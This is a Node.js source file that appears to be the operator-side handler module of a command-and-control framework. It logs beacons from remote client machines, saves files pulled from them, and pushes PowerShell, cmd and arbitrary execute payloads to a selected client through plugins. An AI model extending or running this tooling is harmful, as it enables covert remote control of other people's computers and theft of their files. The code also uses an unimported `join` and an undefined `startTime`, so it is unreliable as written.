const { promisify } = require('node:util');
const { mkdir, writeFile, existsSync } = require('node:fs');
const { log, logInfo, logError, logSuccess } = require('./logging');
const { getClientCommands, getServerCommands } = require('./commands');
const { sendClientCommand, showActiveClients, showClient, setClientActive } = require('./clients');
const { displayCommandOptions, displayActivePlugins, getUptime } = require('./helpers');
const { getLoadedPlugins } = require('./plugins');
const { clearServerConsole } = require('./readline');

require('../typedef/definitions');

const mkdir_promise = promisify(mkdir);
const writeFile_promise = promisify(writeFile);

const config = require('./config');

/**
 * Beacon handler
 * @param {*} response 
 * @param {Client} client
 */
const handleBeacon = (response, client) => {
    logInfo(`\nReceived beacon from client: ${client.sessionId}`);
    const date = new Date();
    const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
    const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
    const formattedDate = date.toLocaleDateString('en-US', dateOptions);
    const formattedTime = date.toLocaleTimeString('en-US', timeOptions);
    client.lastSeen = `${formattedDate} ${formattedTime}`;
    client.active = true;
    client.type = response.type;
    client.version = response.version;
    client.platform = response.platform;
    client.arch = response.arch; 
    client.osver = response.osver; 
    client.hostname = response.hostname;
};

/**
 * Download handler
 * @param {*} response 
 */
const handleDownloadResponse = async (response) => {
    try {
        if (!existsSync(join(__dirname, config.path.downloads))) {
            await mkdir_promise(join(__dirname, config.path.downloads));
        }
        const fileName = response.download;
        const assembledFilePath = join(join(__dirname, config.path.downloads), fileName);
        await writeFile_promise(assembledFilePath, Buffer.from(response.data, 'base64'));
        logSuccess(`\nFile "${fileName}" downloaded successfully to ${join(__dirname, config.path.downloads)}`);
    } catch (error) {
        logError(`Error handling download response: ${error.message}`);
    }
};

/**
 * Default handler
 * @param {*} response
 */
const handleResponse = (response) => {
    if (!response) {
        logError("Error: invalid response.");
        return;
    }
    // deconstruct the response response if exists;
    if (response.response) {
        response = response.response;
    }
    if (response.data) {
        let data = response.data;
        if (data.type === "Buffer") {
            // handle buffer response
            const response = Buffer.from(data.data).toString('utf8').trim();
            log(response, undefined);
        } else {
            if (typeof data !== 'string') {
                data = JSON.stringify(data);
            }
            log(data.toString('utf8').trim(), undefined);
        }
    } else if (response.message) {
        logInfo(response.message);
    } else if (response.error) {
        logError(response.error);
    }
};

/**
 * Handles the command input for the server
 * @param {string} command 
 * @param {string[]} properties
 * @param {Interface} readline
 */
const handleCommandWithArgs = async (command, properties, readline) => {
    try {
        const clientCommands = getClientCommands();
        const serverCommands = getServerCommands();
        const loadedPlugins = getLoadedPlugins();
        if (clientCommands.includes(command.split(' ')[0]) ||
            serverCommands.includes(command.split(' ')[0])) {
            let handledByPlugin = false;
            for (const [pluginName, pluginModule] of loadedPlugins.entries()) {
                if (pluginModule.commands && pluginModule.commands[command]) {
                    const pluginCommand = pluginModule.commands[command];
                    if (pluginModule.type === 'server') {
                        pluginCommand.handler(properties, readline);
                    } else if (pluginModule.type === 'client') {
                        switch (pluginCommand.method) {
                            case 'payload-ps':
                                await sendClientCommand('ps', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'payload-cmd':
                                await sendClientCommand('cmd', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'execute':
                                command = pluginCommand.handler(properties);
                                await sendClientCommand(command, properties);
                                break;
                            default:
                        }
                    }
                    handledByPlugin = true;
                    break;
                }
            }
            if (!handledByPlugin) {
                switch (command) {
                    case 'clear':
                        clearServerConsole();
                        break;
                    case 'uptime':
                        log(getUptime(startTime));
                        break;
                    case 'set':
                        setClientActive(properties[0]);
                        break;
                    case 'plugins':
                        displayActivePlugins();
                        break;
                    case 'help':
                        displayCommandOptions();
                        break;
                    case 'client':
                        showClient();
                        break;
                    case 'clients':
                        showActiveClients();
                        break;
                    default:
                        logInfo('Invalid command. Type "help" to see available commands.');
                }
            }
        }
    } catch (error) {
        logError(`Exception: ${error.message}`);
    }
};

module.exports = {
    handleBeacon,
    handleResponse,
    handleDownloadResponse,
    handleCommandWithArgs
};